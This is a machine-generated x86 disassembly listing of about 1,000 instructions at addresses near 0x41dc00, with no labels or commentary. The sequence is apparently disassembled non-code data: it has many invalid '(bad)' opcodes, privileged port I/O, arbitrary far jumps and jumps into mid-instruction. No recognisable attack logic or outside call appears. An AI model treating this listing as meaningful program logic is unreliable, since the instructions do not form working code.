  41dbb7:	aam    0x24
  41dbb9:	(bad)  
  41dbba:	jmp    0x54f6:0x47691d16
  41dbc1:	out    0x36,al
  41dbc3:	pusha  
  41dbc4:	inc    eax
  41dbc5:	xchg   ecx,eax
  41dbc6:	aad    0xd7
  41dbc8:	xchg   edx,eax
  41dbc9:	popf   
  41dbca:	dec    esi
  41dbcb:	aad    0x8a
  41dbcd:	(bad)  
  41dbce:	icebp  
  41dbcf:	lods   eax,DWORD PTR ds:[esi]
  41dbd0:	xor    DWORD PTR [eax-0x6d],0x15bd4e97
  41dbd7:	cwde   
  41dbd8:	cmp    cl,BYTE PTR [eax-0x6c]
  41dbdb:	pop    ebp
  41dbdc:	rol    esp,0x1a
  41dbdf:	mov    gs,WORD PTR [ecx-0x47]
  41dbe2:	scas   eax,DWORD PTR es:[edi]
  41dbe3:	fdivr  DWORD PTR [edx+0x2b0f2cc6]
  41dbe9:	loopne 0x41dbe3
  41dbeb:	cmp    BYTE PTR [ecx-0x2c],cl
  41dbee:	mov    fs,WORD PTR [edi+0x18]
  41dbf1:	jmp    DWORD PTR ds:0xd2a3b4f5
  41dbf7:	dec    ebx
  41dbf8:	lock xor eax,0x4822dc3
  41dbfe:	xchg   edx,eax
  41dbff:	sub    al,0x6e
  41dc01:	std    
  41dc02:	inc    esi
  41dc03:	add    ah,BYTE PTR [ebp-0x475ce98b]
  41dc09:	imul   ecx,DWORD PTR [esi-0x27],0xffffff82
  41dc0d:	scas   al,BYTE PTR es:[edi]
  41dc0e:	jae    0x41dc8a
  41dc10:	fnstsw WORD PTR [ebx]
  41dc12:	jle    0x41dc23
  41dc14:	ret    
  41dc15:	out    0xd6,al
  41dc17:	and    dl,BYTE PTR [esi-0x1f4a15ee]
  41dc1d:	retf   
  41dc1e:	test   eax,0x30aa38cb
  41dc23:	pop    ebp
  41dc24:	or     BYTE PTR [esp+esi*4],ch
  41dc27:	jmp    0xd1375d27
  41dc2c:	js     0x41dbe3
  41dc2e:	(bad)  
  41dc2f:	pop    ebp
  41dc30:	mov    bh,0xd3
  41dc32:	sbb    DWORD PTR [edx-0x76],0x3201d591
  41dc39:	or     BYTE PTR [edi-0x426c5d69],cl
  41dc3f:	push   esp
  41dc40:	(bad)
  41dc45:	xor    esp,esp
  41dc47:	cs in  al,0xd
  41dc4a:	sub    DWORD PTR [edi+0x4f],ebp
  41dc4d:	bound  eax,QWORD PTR [eax-0x698cad68]
  41dc53:	retf   
  41dc54:	sbb    BYTE PTR [esi+ebx*1],0x28
  41dc58:	mov    eax,0xf79d9165
  41dc5d:	add    al,0xf5
  41dc5f:	bound  edx,QWORD PTR [ebx]
  41dc61:	push   ecx
  41dc62:	sbb    eax,DWORD PTR [ebx+0x4]
  41dc65:	mov    ebx,0xf2387205
  41dc6a:	xor    al,0x49
  41dc6c:	mov    BYTE PTR [edx],0xf2
  41dc6f:	int3   
  41dc70:	dec    esp
  41dc71:	rol    DWORD PTR [edx-0x6b87218c],0x44
  41dc78:	out    dx,al
  41dc79:	and    ebp,DWORD PTR [ebp-0x6e22f578]
  41dc7f:	push   edi
  41dc80:	pop    ss
  41dc81:	pop    edx
  41dc82:	mov    eax,edx
  41dc84:	js     0x41dc76
  41dc86:	or     eax,0xd2c7fd62
  41dc8b:	mov    ch,0x2e
  41dc8d:	fwait
  41dc8e:	push   ss
  41dc8f:	cmp    ebx,0x54a02ba
  41dc95:	mov    bl,0x7b
  41dc97:	int    0x89
  41dc99:	mov    eax,ds:0x785b6faa
  41dc9e:	xchg   ebp,eax
  41dc9f:	cmp    DWORD PTR [ebx],0x49
  41dca2:	mov    esi,0x94003efe
  41dca7:	pop    eax
  41dca8:	add    BYTE PTR [edx-0x5e1f6dee],bl
  41dcae:	(bad)  
  41dcaf:	in     al,dx
  41dcb0:	fcmovne st,st(0)
  41dcb2:	fdiv   QWORD PTR [esi+0x4f]
  41dcb5:	mov    ch,0x99
  41dcb7:	add    eax,DWORD PTR [edx]
  41dcb9:	xchg   ecx,eax
  41dcba:	(bad)  
  41dcbb:	stos   BYTE PTR es:[edi],al
  41dcbc:	test   ch,cl
  41dcbe:	sub    ecx,ebx
  41dcc0:	adc    DWORD PTR [ebp+0x27],esp
  41dcc3:	test   BYTE PTR [ebp+edi*1-0x4f277a5e],dh
  41dcca:	sub    eax,0x706c1761
  41dccf:	adc    BYTE PTR [ebx+0x6],ch
  41dcd2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dcd3:	ja     0x41dcbc
  41dcd5:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  41dcd7:	test   DWORD PTR [edx+0x1a],eax
  41dcda:	dec    ebp
  41dcdb:	out    0xad,al
  41dcdd:	or     DWORD PTR [edi+0x7074555b],ebx
  41dce3:	test   DWORD PTR [ebp+0x7241ed57],eax
  41dce9:	adc    eax,DWORD PTR [ecx]
  41dceb:	je     0x41dce9
  41dced:	in     eax,0x3d
  41dcef:	or     ch,BYTE PTR [eax-0x260c6b00]
  41dcf5:	gs dec ebx
  41dcf7:	loope  0x41dd4d
  41dcf9:	dec    eax
  41dcfa:	adc    eax,0x4a7148f1
  41dcff:	jo     0x41dc9c
  41dd01:	fst    DWORD PTR [ebx]
  41dd03:	xor    BYTE PTR [ecx+ebx*1+0x2092ee4d],bl
  41dd0a:	jne    0x41dd67
  41dd0c:	adc    al,0x76
  41dd0e:	addr16 xchg ebp,eax
  41dd10:	rcl    DWORD PTR [ebx+esi*8-0x2ac1223a],cl
  41dd17:	hlt    
  41dd18:	xchg   DWORD PTR ss:[ebp+0x5f],ecx
  41dd1c:	adc    ah,BYTE PTR [esi+0x12a46a0e]
  41dd22:	cli    
  41dd23:	outs   dx,BYTE PTR ds:[esi]
  41dd24:	and    ah,BYTE PTR [eax-0x456842ee]
  41dd2a:	mov    dl,0xd9
  41dd2c:	or     ebx,DWORD PTR [eax*1-0x1a57c6c3]
  41dd33:	mov    BYTE PTR [ecx-0x49d1a5d2],dh
  41dd39:	in     al,dx
  41dd3a:	dec    edx
  41dd3b:	ret    0x4cdb
  41dd3e:	aam    0x4f
  41dd40:	aam    0x3d
  41dd42:	dec    ecx
  41dd43:	test   al,0xde
  41dd45:	(bad)  
  41dd46:	rcl    BYTE PTR [ecx],cl
  41dd48:	cmp    BYTE PTR [ecx],dh
  41dd4a:	imul   eax,edi,0x34
  41dd4d:	sahf   
  41dd4e:	sub    DWORD PTR [edx+0x71],0xffffffa2
  41dd52:	nop
  41dd53:	out    dx,al
  41dd54:	mov    bh,0x96
  41dd56:	sub    bh,cl
  41dd58:	jne    0x41dd1e
  41dd5a:	aas    
  41dd5b:	dec    edx
  41dd5c:	and    eax,0x450bfcf2
  41dd61:	xchg   edx,eax
  41dd62:	dec    ecx
  41dd63:	stos   DWORD PTR es:[edi],eax
  41dd64:	pop    ecx
  41dd65:	repnz sub bl,ah
  41dd68:	jle    0x41ddc9
  41dd6a:	xor    BYTE PTR [edx],dh
  41dd6c:	imul   edi,DWORD PTR [edi-0x50],0x322c34bc
  41dd73:	or     dh,BYTE PTR [ebp-0xd04f49f]
  41dd79:	jecxz  0x41ddb4
  41dd7b:	xchg   edi,eax
  41dd7c:	sub    ah,cl
  41dd7e:	or     BYTE PTR [ebx],0xcf
  41dd81:	sbb    DWORD PTR [ebx+0x77],ebp
  41dd84:	and    BYTE PTR [edx+0x3a40f826],ah
  41dd8a:	ss mov bh,0x91
  41dd8d:	in     al,dx
  41dd8e:	xor    ebx,DWORD PTR [esi-0x78]
  41dd91:	cmp    eax,0xc8a0d40
  41dd96:	test   al,0x19
  41dd98:	jnp    0x41dd2b
  41dd9a:	push   eax
  41dd9b:	and    esi,ecx
  41dd9d:	popa   
  41dd9e:	mov    dh,0xd4
  41dda0:	cs mov eax,0xe3d222d3
  41dda6:	cwde   
  41dda7:	and    eax,0x8ef8d2f2
  41ddac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ddad:	inc    edx
  41ddae:	mov    bl,0xe2
  41ddb0:	add    eax,DWORD PTR [esp+edi*2-0x2bf27e0e]
  41ddb7:	push   ds
  41ddb8:	push   ebp
  41ddb9:	cmp    edx,eax
  41ddbb:	cmp    ecx,esi
  41ddbd:	fwait
  41ddbe:	int    0xde
  41ddc0:	(bad)  
  41ddc1:	add    DWORD PTR [edx+0x6e7f0662],edx
  41ddc7:	or     edi,DWORD PTR [edx]
  41ddc9:	aam    0x86
  41ddcb:	ss pop es
  41ddcd:	in     eax,dx
  41ddce:	jae    0x41de1a
  41ddd0:	mov    WORD PTR [esp+eax*8+0x11],ds
  41ddd4:	test   eax,0xee9f25c2
  41ddd9:	mov    cl,0x65
  41dddb:	ja     0x41dd7d
  41dddd:	in     eax,0xcb
  41dddf:	lods   eax,DWORD PTR ds:[esi]
  41dde0:	pusha  
  41dde1:	fild   DWORD PTR [ecx]
  41dde3:	scas   eax,DWORD PTR es:[edi]
  41dde4:	pop    edi
  41dde5:	mov    edx,0x2bcfcd9b
  41ddea:	dec    ebx
  41ddeb:	cmp    dh,BYTE PTR [edx+ebp*2]
  41ddee:	push   cs
  41ddef:	add    BYTE PTR [edx-0x73],0xfc
  41ddf3:	add    al,0x79
  41ddf5:	ret    
  41ddf6:	loop   0x41dd81
  41ddf8:	pop    ebx
  41ddf9:	test   eax,0xb399dcfc
  41ddfe:	test   al,0xa0
  41de00:	xchg   ecx,eax
  41de01:	dec    ebp
  41de02:	adc    ah,BYTE PTR [eax+edx*1]
  41de05:	jmp    0x41de05
  41de07:	lock push cs
  41de09:	push   esi
  41de0a:	les    edi,FWORD PTR [ecx]
  41de0c:	pop    ds
  41de0d:	fcomi  st,st(7)
  41de0f:	mov    BYTE PTR [eax],dl
  41de11:	cmp    ecx,DWORD PTR [ecx]
  41de13:	xchg   ebp,eax
  41de14:	lods   eax,DWORD PTR ds:[esi]
  41de15:	in     al,dx
  41de16:	jge    0x41de10
  41de18:	vhaddpd xmm2,xmm6,XMMWORD PTR [eax-0x68bc2444]
  41de20:	repz test eax,0xcfd71ba4
  41de26:	adc    al,0x12
  41de28:	xchg   ebx,eax
  41de29:	pop    es
  41de2a:	jns    0x41ddd5
  41de2c:	pop    ds
  41de2d:	shl    DWORD PTR [eax],cl
  41de2f:	loop   0x41ddde
  41de31:	sub    bh,BYTE PTR [edx-0x10]
  41de34:	jl     0x41de65
  41de36:	mov    ebx,DWORD PTR [edi]
  41de38:	push   ds
  41de39:	cli    
  41de3a:	jno    0x41dde0
  41de3c:	repnz std 
  41de3e:	addr16 mov bl,0xd1
  41de41:	jecxz  0x41de2a
  41de43:	lods   eax,DWORD PTR ds:[si]
  41de45:	pop    ebp
  41de46:	push   edx
  41de47:	inc    eax
  41de48:	cwde   
  41de49:	pop    esp
  41de4a:	pop    edi
  41de4b:	cwde   
  41de4c:	mov    edi,0x3811255a
  41de51:	pop    ecx
  41de52:	mov    BYTE PTR [edx-0x70],al
  41de55:	jns    0x41ddd8
  41de57:	fs push es
  41de59:	mov    ch,0x2b
  41de5b:	ror    BYTE PTR [eax+0x5b],cl
  41de5e:	xor    eax,0xfd465a33
  41de63:	xchg   esp,eax
  41de64:	xlat   BYTE PTR ds:[ebx]
  41de65:	mov    eax,ds:0x8c6c78cb
  41de6a:	push   ecx
  41de6b:	cmp    ah,bl
  41de6d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41de6e:	pop    ds
  41de6f:	fisttp QWORD PTR [eax]
  41de71:	mov    al,ds:0x11c76849
  41de76:	xchg   esi,eax
  41de77:	dec    esp
  41de78:	int3   
  41de79:	hlt    
  41de7a:	fsub   DWORD PTR [edx+0x240c9548]
  41de80:	lds    esi,FWORD PTR [ebp+0x642dd2d8]
  41de86:	add    eax,0xdfbb4d5e
  41de8b:	dec    eax
  41de8c:	xchg   edx,eax
  41de8d:	clc    
  41de8e:	addr16 jnp 0x41de6b
  41de91:	test   al,0x1a
  41de93:	sbb    ah,ch
  41de95:	add    edi,DWORD PTR [ebx]
  41de97:	mov    esi,0xa82df312
  41de9c:	mov    ecx,DWORD PTR [esi-0x6948d281]
  41dea2:	push   cs
  41dea3:	jno    0x41decd
  41dea5:	xchg   esp,eax
  41dea6:	xor    ebp,esp
  41dea8:	stos   BYTE PTR es:[edi],al
  41dea9:	mov    cl,0x49
  41deab:	cli    
  41deac:	(bad)  
  41dead:	sub    ecx,DWORD PTR [ebx]
  41deaf:	sete   dl
  41deb2:	cmp    ebx,ebp
  41deb4:	jnp    0x41deaa
  41deb6:	push   eax
  41deb7:	or     edi,DWORD PTR [ecx-0x612c671]
  41debd:	xor    al,BYTE PTR [ebx+0x6e]
  41dec0:	loope  0x41de6e
  41dec2:	mov    ebp,0xb74550e7
  41dec7:	mov    cl,0x5
  41dec9:	mov    esi,0x13710b72
  41dece:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41decf:	arpl   WORD PTR [ecx-0x12ff2d0d],sp
  41ded5:	jmp    0x455d:0x994ba9b9
  41dedc:	and    DWORD PTR [eax+edi*8+0x21],edi
  41dee0:	xchg   ebp,eax
  41dee1:	daa    
  41dee2:	inc    ebp
  41dee3:	ret    
  41dee4:	and    ebx,edi
  41dee6:	jbe    0x41df5e
  41dee8:	aaa    
  41dee9:	inc    ebx
  41deea:	sbb    al,0xb5
  41deec:	adc    ah,ah
  41deee:	adc    edi,DWORD PTR [esi-0x11]
  41def1:	icebp  
  41def2:	sbb    BYTE PTR [edi],0x80
  41def5:	pop    edx
  41def6:	lods   eax,DWORD PTR ds:[esi]
  41def7:	data16 or bl,BYTE PTR ds:0x576eba14
  41defe:	repz adc dh,cl
  41df01:	pusha  
  41df02:	xchg   BYTE PTR [eax+0x4444dedf],ch
  41df08:	(bad)  
  41df0a:	jmp    0x714a8e65
  41df0f:	dec    edi
  41df10:	dec    edx
  41df11:	jns    0x41deb8
  41df13:	repz (bad) 
  41df15:	push   ecx
  41df16:	ins    DWORD PTR es:[edi],dx
  41df17:	(bad)  [ebx+0x18]
  41df1a:	dec    ebp
  41df1b:	out    0x29,al
  41df1d:	daa    
  41df1e:	sbb    DWORD PTR [edi-0x5b487af9],ebx
  41df24:	xchg   edx,eax
  41df25:	xlat   BYTE PTR ds:[ebx]
  41df26:	cmp    bl,BYTE PTR [ecx]
  41df28:	mov    edi,0x4e1d7418
  41df2d:	je     0x41df6a
  41df2f:	fwait
  41df30:	test   eax,0xda0faa46
  41df35:	loope  0x41df33
  41df37:	mov    bl,0xea
  41df39:	pusha  
  41df3a:	pop    es
  41df3b:	xchg   edi,eax
  41df3c:	outs   dx,BYTE PTR ds:[esi]
  41df3d:	ss jle 0x41df35
  41df40:	inc    ecx
  41df41:	out    0x4a,al
  41df43:	xchg   edx,eax
  41df44:	cli    
  41df45:	dec    ebx
  41df46:	nop
  41df47:	xchg   edi,eax
  41df48:	cmc    
  41df49:	push   0x634de6a5
  41df4e:	cmp    al,0x8f
  41df50:	add    al,0x64
  41df52:	xor    esp,edi
  41df54:	adc    DWORD PTR [ebx+0xd7b64f0],eax
  41df5a:	pop    esp
  41df5b:	cwde   
  41df5c:	(bad)  
  41df5e:	in     eax,dx
  41df5f:	aad    0xad
  41df61:	mov    ecx,0xc9410c75
  41df66:	sub    dl,BYTE PTR [ebx]
  41df68:	pusha  
  41df69:	mov    dh,0xe6
  41df6b:	cld    
  41df6c:	les    ecx,FWORD PTR [edx+edx*2+0x420dcb30]
  41df73:	ja     0x41df4c
  41df75:	ins    DWORD PTR es:[edi],dx
  41df76:	fisub  DWORD PTR [edi]
  41df78:	clc    
  41df79:	cmc    
  41df7a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41df7b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41df7c:	arpl   bp,di
  41df7e:	out    dx,eax
  41df7f:	inc    esp
  41df80:	add    eax,0x36569124
  41df85:	jecxz  0x41df1a
  41df87:	add    BYTE PTR [ecx],bh
  41df89:	(bad)  
  41df8a:	pop    edx
  41df8b:	and    DWORD PTR [ebx+0x4b4061f],ebp
  41df91:	aas    
  41df92:	outs   dx,BYTE PTR ds:[esi]
  41df93:	cmp    ah,BYTE PTR [edx+0x76756e0f]
  41df99:	push   ss
  41df9a:	pop    edi
  41df9b:	sub    dh,BYTE PTR [eax]
  41df9d:	(bad)  
  41df9e:	mov    bl,0xe6
  41dfa0:	inc    esp
  41dfa1:	inc    esp
  41dfa2:	shr    DWORD PTR [esi-0x79],cl
  41dfa5:	mov    ebp,0x820b2952
  41dfaa:	jp     0x41e008
  41dfac:	stc    
  41dfad:	mov    BYTE PTR [eax+ecx*2+0x6d],ch
  41dfb1:	sbb    ecx,DWORD PTR [ecx+0x4e]
  41dfb4:	xchg   ebx,eax
  41dfb5:	sbb    ch,bl
  41dfb7:	cs adc al,0xd9
  41dfba:	ins    BYTE PTR es:[edi],dx
  41dfbb:	or     ebx,DWORD PTR ds:0x5e0fa59b
  41dfc1:	out    0x82,eax
  41dfc3:	int    0x5c
  41dfc5:	mov    cl,0xfe
  41dfc7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dfc8:	mov    ebp,DWORD PTR [esi-0x4de9a1d6]
  41dfce:	sbb    eax,0xb162aeb7
  41dfd3:	cmc    
  41dfd4:	jge    0x41df94
  41dfd6:	out    0x57,al
  41dfd8:	repz mov bh,BYTE PTR [edi+eax*8]
  41dfdc:	enter  0xbbe2,0x5
  41dfe0:	daa    
  41dfe1:	shl    BYTE PTR [ebx+0x32],1
  41dfe4:	je     0x41e007
  41dfe6:	dec    eax
  41dfe7:	shl    BYTE PTR [edi+0x4],cl
  41dfea:	loopne 0x41dfca
  41dfec:	sbb    BYTE PTR [edi+0x36],ch
  41dfef:	and    DWORD PTR [edx+0x4e],eax
  41dff2:	inc    eax
  41dff3:	push   esp
  41dff4:	xlat   BYTE PTR ds:[ebx]
  41dff5:	push   esp
  41dff6:	mov    DWORD PTR [edx-0x52c75c9c],0x6d96f0af
  41e000:	cmp    eax,0xfb2973ff
  41e005:	test   BYTE PTR [eax+0x552ba40e],ch
  41e00b:	xor    al,0x62
  41e00d:	stos   BYTE PTR es:[edi],al
  41e00e:	nop
  41e00f:	test   DWORD PTR [edi],ebp
  41e011:	scas   al,BYTE PTR es:[edi]
  41e012:	add    esi,DWORD PTR [edi+esi*4+0x17]
  41e016:	cs js  0x41dfed
  41e019:	push   edx
  41e01a:	fwait
  41e01b:	jbe    0x41e08c
  41e01d:	loopne 0x41e044
  41e01f:	(bad)  
  41e020:	lahf   
  41e021:	mov    al,0x89
  41e023:	mov    edx,0x2ec8d632
  41e028:	inc    esi
  41e029:	shl    BYTE PTR [eax],cl
  41e02b:	inc    eax
  41e02c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e02d:	mov    bl,0x2b
  41e02f:	and    bl,cl
  41e031:	jge    0x41e083
  41e033:	mov    cl,0x62
  41e035:	lahf   
  41e036:	lds    eax,FWORD PTR [eax]
  41e038:	lods   eax,DWORD PTR ds:[esi]
  41e039:	mov    DWORD PTR [ecx+eax*4-0x5e],edi
  41e03d:	ret    
  41e03e:	add    DWORD PTR [edx+0x42a31e05],ebp
  41e044:	retf   
  41e045:	add    DWORD PTR [eax],eax
  41e047:	(bad)  
  41e048:	mov    esp,0x673ab4df
  41e04d:	test   eax,0x3cbd7998
  41e052:	(bad)  
  41e053:	nop
  41e054:	mov    eax,0x77dc8434
  41e059:	and    al,0x5e
  41e05b:	cdq    
  41e05c:	pop    ebp
  41e05d:	xchg   edi,eax
  41e05e:	add    esi,DWORD PTR [ebp-0x517603d2]
  41e064:	or     ah,BYTE PTR [edx]
  41e066:	push   cs
  41e067:	adc    bh,al
  41e069:	jae    0x41e087
  41e06b:	xor    dl,ch
  41e06d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e06e:	dec    edx
  41e06f:	xor    edx,DWORD PTR [edi+0x46]
  41e072:	cld    
  41e073:	iret   
  41e074:	das    
  41e075:	sti    
  41e076:	and    cl,0xb1
  41e079:	pop    eax
  41e07a:	mov    eax,0xff91b37
  41e07f:	cli    
  41e080:	lock xchg ecx,eax
  41e082:	ss sub eax,0xa51a060
  41e088:	rcr    BYTE PTR [eax],1
  41e08a:	mov    dl,0x29
  41e08c:	mov    al,0x87
  41e08e:	cvtps2pd xmm0,xmm3
  41e091:	mov    edx,0x77febb2
  41e096:	rol    BYTE PTR [eax],1
  41e098:	lahf   
  41e099:	in     eax,0xf9
  41e09b:	(bad)  
  41e09c:	sub    DWORD PTR [esi],ebx
  41e09e:	pop    eax
  41e09f:	mov    ch,0x94
  41e0a1:	in     eax,dx
  41e0a2:	sub    DWORD PTR [ecx+0x65],esi
  41e0a5:	(bad)  
  41e0a6:	fst    st(1)
  41e0a8:	and    DWORD PTR ds:0x8844bdfa,0x17
  41e0af:	ds scas eax,DWORD PTR es:[edi]
  41e0b1:	mov    BYTE PTR [edx+0x4fe3f420],ah
  41e0b7:	cmp    DWORD PTR [ecx],edx
  41e0b9:	xor    dl,BYTE PTR [eax]
  41e0bb:	mov    dl,0x8
  41e0bd:	out    dx,eax
  41e0be:	(bad)  
  41e0bf:	lods   eax,DWORD PTR ds:[esi]
  41e0c0:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  41e0c2:	adc    BYTE PTR [edi*2+0x1d82bcbe],bh
  41e0c9:	enter  0xcd1f,0xfc
  41e0cd:	sti    
  41e0ce:	out    0x82,al
  41e0d0:	retf   0x811c
  41e0d3:	jg     0x41e0fc
  41e0d5:	ja     0x41e120
  41e0d7:	or     eax,0xa4444345
  41e0dc:	xor    al,0x4f
  41e0de:	icebp  
  41e0df:	mov    ebx,0x8f6f5ba5
  41e0e4:	lahf   
  41e0e5:	mov    ds:0x929a798a,al
  41e0ea:	push   0xffffffc2
  41e0ec:	les    ecx,FWORD PTR [ecx]
  41e0ee:	cmp    DWORD PTR [esi],eax
  41e0f0:	dec    edx
  41e0f1:	mov    DWORD PTR [ecx+esi*1-0x28],edx
  41e0f5:	retf   
  41e0f6:	or     ah,cl
  41e0f8:	sahf   
  41e0f9:	out    0xd8,eax
  41e0fb:	mov    esp,0xf8469a38
  41e100:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e101:	clc    
  41e102:	dec    BYTE PTR [esi-0x4d]
  41e105:	nop
  41e106:	fdivp  st(2),st
  41e108:	sub    eax,0xe680298a
  41e10d:	xchg   edi,eax
  41e10e:	xchg   edx,eax
  41e10f:	cmp    eax,0x82a164d4
  41e114:	neg    DWORD PTR [esi]
  41e116:	repz cmp edx,edi
  41e119:	aad    0x20
  41e11b:	and    BYTE PTR [ebx],dh
  41e11d:	in     eax,0xe8
  41e11f:	aaa    
  41e120:	jae    0x41e183
  41e122:	mov    esp,0x47160151
  41e127:	dec    ebp
  41e128:	inc    ecx
  41e129:	jmp    0x5c6bb63a
  41e12e:	or     DWORD PTR [eax-0x2a861797],0x3ed6f8a4
  41e138:	adc    DWORD PTR [ebx-0x30],eax
  41e13b:	mov    ds:0x2e2f2b12,al
  41e140:	dec    esi
  41e141:	dec    edx
  41e142:	inc    edx
  41e143:	imul   ebx,DWORD PTR [edx],0x766ca0d2
  41e149:	scas   al,BYTE PTR es:[edi]
  41e14a:	mov    ebp,0xd6cc8246
  41e14f:	fld    QWORD PTR [eax]
  41e151:	mov    ah,0xb3
  41e153:	ss nop
  41e155:	bound  ebx,QWORD PTR [edi+0x19241440]
  41e15b:	add    DWORD PTR [edi],edx
  41e15d:	sub    BYTE PTR [edx-0x78],bl
  41e160:	mov    cl,0xa7
  41e162:	ror    BYTE PTR [ebp+edx*4-0x4b],0x73
  41e167:	pop    edx
  41e168:	pop    ss
  41e169:	test   eax,0xdb435854
  41e16e:	dec    edi
  41e16f:	cmp    BYTE PTR [ebx],dh
  41e171:	and    edi,edi
  41e173:	dec    esp
  41e174:	sub    eax,DWORD PTR [ebx-0x7b]
  41e177:	mov    esp,edx
  41e179:	dec    ebp
  41e17a:	push   esp
  41e17b:	icebp  
  41e17c:	adc    dh,BYTE PTR [esi-0x5b]
  41e17f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e180:	(bad)  [esi+0x14acbee7]
  41e186:	or     al,0xd5
  41e188:	in     al,0x5b
  41e18a:	outs   dx,DWORD PTR ds:[esi]
  41e18b:	fcmovnbe st,st(5)
  41e18d:	es aas 
  41e18f:	cmp    esp,DWORD PTR [eax+0x40]
  41e192:	scas   eax,DWORD PTR es:[edi]
  41e193:	mov    esp,DWORD PTR [ecx]
  41e195:	push   ss
  41e196:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e197:	sbb    ecx,eax
  41e199:	leave  
  41e19a:	retf   0x5123
  41e19d:	ret    0xf2b1
  41e1a0:	nop
  41e1a1:	out    dx,eax
  41e1a2:	(bad)  
  41e1a3:	adc    eax,0xf509a095
  41e1a8:	push   eax
  41e1a9:	sar    BYTE PTR [eax+edi*8+0x64f81d25],1
  41e1b0:	sub    BYTE PTR [ecx],bh
  41e1b2:	test   eax,0x9811fa83
  41e1b7:	jmp    0x41e14a
  41e1b9:	pop    ss
  41e1ba:	sub    ebx,DWORD PTR [edx]
  41e1bc:	pop    ss
  41e1bd:	outs   dx,BYTE PTR ds:[esi]
  41e1be:	push   0x1d7e3c81
  41e1c3:	inc    edx
  41e1c4:	cmp    eax,0x9733ee32
  41e1c9:	int    0x9b
  41e1cb:	sbb    eax,0xd72dab03
  41e1d0:	lea    ebp,[esi]
  41e1d2:	dec    edx
  41e1d3:	shl    DWORD PTR [edi-0x59],0x40
  41e1d7:	in     al,dx
  41e1d8:	in     al,dx
  41e1d9:	out    0x14,eax
  41e1db:	aas    
  41e1dc:	fsubr  DWORD PTR [esi]
  41e1de:	push   ds
  41e1df:	nop
  41e1e0:	ins    DWORD PTR es:[edi],dx
  41e1e1:	mov    ebp,0xc1e13b54
  41e1e6:	mov    eax,ds:0x9f817073
  41e1eb:	ret    
  41e1ec:	test   edx,eax
  41e1ee:	or     dh,BYTE PTR [eax+0x297b3aa7]
  41e1f4:	(bad)  
  41e1f5:	dec    ecx
  41e1f6:	loopne 0x41e275
  41e1f8:	cwde   
  41e1f9:	sbb    edi,DWORD PTR [esi+0x32]
  41e1fc:	or     eax,eax
  41e1fe:	loope  0x41e1a2
  41e200:	jmp    0xc54bd49d
  41e205:	fistp  QWORD PTR [eax]
  41e207:	cmp    ecx,ebx
  41e209:	and    bh,bl
  41e20b:	push   0xffffff9b
  41e20d:	sbb    ecx,ecx
  41e20f:	inc    eax
  41e210:	test   eax,0x7e99f10
  41e215:	sbb    DWORD PTR [ecx-0xf],ecx
  41e218:	cmp    ebx,DWORD PTR [esi-0x248324]
  41e21e:	adc    DWORD PTR [ebp+0x22],esp
  41e221:	jg     0x41e1e8
  41e223:	iret   
  41e224:	call   0xbb67a493
  41e229:	and    eax,0xf5f56749
  41e22e:	xchg   ebx,eax
  41e22f:	or     ebx,DWORD PTR [ecx-0x9ef23e8]
  41e235:	mov    bl,0x20
  41e237:	dec    edx
  41e238:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e239:	dec    ebp
  41e23a:	in     al,dx
  41e23b:	sub    DWORD PTR [esi],esp
  41e23d:	test   al,0x59
  41e23f:	pop    edx
  41e240:	xor    dl,ch
  41e242:	mov    edi,0x194bce30
  41e247:	or     DWORD PTR [ebp+esi*1-0x78],ebx
  41e24b:	aad    0xe3
  41e24d:	test   BYTE PTR [esi-0x606d7687],ah
  41e253:	out    0xb1,eax
  41e255:	mov    dl,0xd1
  41e257:	(bad)  
  41e25a:	cmp    BYTE PTR [ebx-0x1ff401b2],bl
  41e260:	data16 jo 0x41e289
  41e263:	rol    DWORD PTR [eax],cl
  41e265:	cmp    BYTE PTR [ebp+0x28],ah
  41e268:	pop    ecx
  41e269:	scas   al,BYTE PTR es:[edi]
  41e26a:	push   eax
  41e26b:	cmp    bl,BYTE PTR [ebx+0x1889ff22]
  41e271:	dec    ebp
  41e272:	cmp    DWORD PTR [edi+0x48d8e938],eax
  41e278:	test   eax,0x2d92cebc
  41e27d:	or     ah,BYTE PTR [eax]
  41e27f:	jmp    0x66fa0c44
  41e284:	jo     0x41e246
  41e286:	pushf  
  41e287:	mov    esp,0xd0549c4b
  41e28c:	std    
  41e28d:	add    DWORD PTR [eax+eiz*2+0x114e12ce],0xc4cb1b4c
  41e298:	mov    bl,0x8d
  41e29a:	sbb    al,0xef
  41e29c:	popa   
  41e29d:	push   esi
  41e29e:	cmp    cl,BYTE PTR [esi-0x5d]
  41e2a1:	adc    edx,DWORD PTR [edx+0x23]
  41e2a4:	push   edi
  41e2a5:	in     al,0x2a
  41e2a7:	lods   eax,DWORD PTR ds:[esi]
  41e2a8:	and    eax,0x7f456e20
  41e2ad:	and    dl,BYTE PTR [ecx+0x6b]
  41e2b0:	sub    al,0x3e
  41e2b2:	mov    edx,0x54af5fcc
  41e2b7:	rcl    BYTE PTR [edx-0x22],cl
  41e2ba:	adc    BYTE PTR [esi-0x64d657cd],0xc8
  41e2c1:	hlt    
  41e2c2:	bound  esi,QWORD PTR [esi+esi*1-0x52]
  41e2c6:	dec    esp
  41e2c7:	adc    ch,0xd8
  41e2ca:	or     BYTE PTR [esi],ah
  41e2cc:	cmp    ch,BYTE PTR ds:0x26f64ce6
  41e2d2:	or     al,0x50
  41e2d5:	enter  0x1f77,0x85
  41e2d9:	mov    ebp,0x31996bfa
  41e2de:	in     eax,0xf1
  41e2e0:	out    dx,eax
  41e2e1:	add    eax,0x7fb85843
  41e2e6:	lahf   
  41e2e7:	mov    eax,ds:0x336cd90e
  41e2ec:	ss jle 0x41e2a1
